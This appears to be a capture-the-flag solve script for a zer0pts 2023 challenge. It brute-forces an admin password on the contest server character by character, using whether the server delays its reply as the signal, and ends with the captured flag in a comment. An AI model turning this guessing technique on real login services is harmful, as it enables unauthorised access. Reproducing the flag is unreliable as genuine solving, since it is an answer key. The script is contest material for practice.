#!/usr/bin python3

import socket
import signal

HOST = "misc3.2023.zer0pts.com"
PORT = 10021
ALPH = 'abcdef0123456789'

class Timeout(object):
    def __init__(self, seconds):
        self.seconds = seconds

    def handle_timeout(self, signum, frame):
        raise TimeoutError('Timeout')

    def __enter__(self):
        signal.signal(signal.SIGALRM, self.handle_timeout)
        signal.alarm(self.seconds)
        return self

    def __exit__(self, _type, _value, _traceback):
        signal.alarm(0)

if __name__=='__main__':
    counter = 0
    alphCounter = 0
    confirmedPassword = ''
    data = b''
    while alphCounter != len(ALPH):
        char = ALPH[alphCounter]
        alphCounter += 1
        testPasswd = confirmedPassword + char
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as TCPSocket:
            TCPSocket.connect((HOST, PORT))
            data = TCPSocket.recv(1024)
            if b"Username" in data:
                print("admin")
                TCPSocket.send(b"admin\n")
            data = TCPSocket.recv(1024)
            if b'Password' in data:
                print(testPasswd)
                TCPSocket.send(testPasswd.encode())
            with Timeout(1):
                try:
                    data = TCPSocket.recv(1024)
                except TimeoutError:
                    confirmedPassword += char
                    alphCounter = 0

# zer0pts{d0Nt_r3sp0nd_t00_qu1ck}
